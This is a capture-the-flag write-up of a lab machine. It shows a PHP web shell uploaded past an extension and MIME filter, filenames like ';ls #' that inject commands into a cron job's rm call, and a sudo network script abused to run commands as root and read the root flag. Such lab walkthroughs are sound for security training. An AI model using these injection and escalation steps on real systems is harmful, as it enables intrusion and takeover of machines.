![](./logo.png)

# USER

`gobuster` shows the presence of a `/backup` dir. Contained in the directory is a file called `backup.tar`

The code below deals with checking for a valid file name. It only looks like it looks for a substring with either of the file extensions.
```php
 list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
    if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
    }
}
```

Running this command uploads a test image
```
curl -X POST -F 'submit=x' -F 'myFile=@test.jpeg'  http://10.10.10.146/upload.php 
```

`curl` can be passed through BurpSuite via the command bellow:

```
curl <COMMAND> -x http://127.0.0.1:8080
```

The first level of file checking is via a `mime` check. This can be circumvented using a small part of a valid image. 

```
NOTE: Need to mark the image as execuatable for the exploit to work
```

Just adding `.jpg` to a file with `.php` code in allows us to execute a shell.


We are placed in a low level user known as `apache`. We cannot read `user.txt` so we need to elevate to `guly` it seems.

Present in the the `/home/guly` is a `check_attack.php` that is run via a `cron` job.

Adding a file in `/var/www/html/uploads/` with the name of `; <COMMAND>` is added to the end of the command below in `$value`.

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

For example if we name the file `;ls #`. It will replace the code above like so:

```php
exec("nohup /bin/rm -f $path; ls # > /dev/null 2>&1 &");
```

The files need renaming before each command. The path taken was below:

```
;touch s.sh
;chmod 777 s.sh
<Edit s.sh with shellcode>
;bash s.sh
```

This spawns a user and provides us with a user shell!

# ROOT


Enum shows:
```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

```sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

With a level of fuzzing, the output can be used to find out what is happening with the script.

```
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=<X>
PROXY_METHOD=<X>
BROWSER_ONLY=<X>
BOOTPROTO=<X>
```

As can be seen from the file above, our input goes into the area `<X>`.

Putting `cat /tmp/test` into the `NAME` slot gives us output implying that the content of the file is executed. 

```
/tmp/test: line 1: </tmp/test CONTENT>: command not found
```

The command above shows that the content of the file is executed. Putting the content as `cat /root/root.txt` gives us the flag!